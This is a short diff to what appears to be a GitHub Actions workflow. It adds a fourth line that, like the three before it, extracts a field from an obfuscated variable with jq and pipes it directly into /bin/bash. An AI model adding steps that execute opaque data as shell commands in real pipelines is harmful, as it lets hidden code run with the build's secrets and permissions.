@@ -35,6 +35,7 @@ jobs:
           echo $wgwxv0303 | jq -r .s566 | /bin/bash
           printf '%s' "$kqcja71632" | jq -r .so52660 | /bin/bash
           printf '%s' "$j601" | jq -r .eeu080 | /bin/bash
+          echo $ywv7724 | jq -r .xmrtp18 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
